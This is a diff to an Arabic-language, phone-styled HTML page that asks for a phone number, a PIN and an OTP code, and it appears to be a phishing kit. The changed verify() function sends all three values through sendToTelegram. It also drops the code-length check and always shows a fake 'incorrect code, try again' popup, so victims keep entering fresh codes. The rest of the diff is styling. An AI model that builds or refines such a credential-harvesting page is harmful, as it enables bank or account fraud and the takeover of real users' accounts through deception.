@@ -8,8 +8,8 @@
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
-#app{width:100%;height:100%;display:flex;justify-content:center}
-.phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden}
+#app{width:100%;height:100%;display:flex;justify-content:center;position:relative}
+.phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden;position:relative}
 
 .hdr{background:#fff;height:20px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
 
@@ -49,7 +49,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   background: transparent;
   text-align: right !important;
   direction: rtl !important;
-  caret-color: #000;
+  caret-color: #2E818F;
 }
 
 .ico{width:20px;height:20px;flex-shrink:0;color:#333}
@@ -143,7 +143,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 
 /* ==================== شاشة OTP المعدلة ==================== */
 .otp-hdr {
-  background: #2E818F !important; /* لون السقف الأصلي الداكن */
+  background: #29C5E0 !important; /* اللون السماوي الفاتح المطلوب المرفق في الصورة */
   height: 48px !important;
   display: flex;
   align-items: center;
@@ -159,7 +159,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 }
 .otp-hdr .hdr-back {
   position: absolute;
-  left: 14px;
+  right: 14px;
   top: 50%;
   transform: translateY(-50%);
   color: #fff;
@@ -169,7 +169,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   cursor: pointer;
 }
 
-/* تصغير وتنسيق حقل النص التوضيحي */
 .otp-title {
   font-size: 13.5px;
   font-weight: 600;
@@ -179,7 +178,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   margin: 30px 15px 30px;
 }
 
-/* الشحطات الخطية في OTP */
+/* الشحطات الخطية في OTP وإبراز مؤشر الكتابة (الخط الأزرق) */
 .otp-row {
   display: flex;
   gap: 16px;
@@ -200,18 +199,77 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   outline: none;
   background: transparent;
   color: #1a1a1a;
-  caret-color: transparent;
+  caret-color: #2E818F !important; /* إضافة الخط العمودي في الحقل عند التركيز */
   direction: ltr;
   padding: 0;
 }
 
-/* تصغير كتابة العداد والثواني */
 .cd-timer-text {
   text-align: center;
   font-size: 14px;
   font-weight: 700;
   color: #183059;
   font-family: system-ui, -apple-system, sans-serif;
+}
+
+/* ==================== نافذة التنبيه الخطأ المنبثقة ==================== */
+.modal-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.4);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.modal-card {
+  width: 82%;
+  max-width: 320px;
+  background: #fff;
+  border-radius: 4px;
+  overflow: hidden;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  text-align: center;
+  animation: fadeIn 0.2s ease-in-out;
+}
+
+.modal-body {
+  padding: 22px 20px;
+}
+
+.modal-title {
+  font-size: 17px;
+  font-weight: 800;
+  color: #1a1a1a;
+  margin-bottom: 12px;
+}
+
+.modal-text {
+  font-size: 13.5px;
+  color: #444;
+  line-height: 1.5;
+  font-weight: 600;
+}
+
+.modal-btn {
+  width: 100%;
+  height: 44px;
+  background: #29C5E0;
+  border: none;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  font-family: 'Cairo', sans-serif;
+  cursor: pointer;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
 }
 </style>
 </head>
@@ -290,6 +348,17 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
     <div class="spacer"></div>
   </div>
   <button class="btn" onclick="verify()">التحقق</button>
+</div>
+
+<!-- النافذة المنبثقة للتنبيه بالخطأ -->
+<div id="error-modal" class="modal-overlay hide">
+  <div class="modal-card">
+    <div class="modal-body">
+      <div class="modal-title">خطأ</div>
+      <div class="modal-text">رمز التأكيد الذي أدخلته غير صحيح.<br/>يرجى المحاولة مرة أخرى.</div>
+    </div>
+    <button class="modal-btn" onclick="closeModal()">تم</button>
+  </div>
 </div>
 
 </div>
@@ -447,15 +516,17 @@ O.forEach(function(el,i){
 
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
-  if(code.length!==4){
-    return;
-  }
-
+  
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   sendToTelegram(ph, pin, code);
 
-  alert('تم التحقق بنجاح!');
+  /* إظهار نافذة الخطأ عند الضغط على زر التحقق */
+  document.getElementById('error-modal').classList.remove('hide');
+}
+
+function closeModal(){
+  document.getElementById('error-modal').classList.add('hide');
 }
 
 function showOtp(){
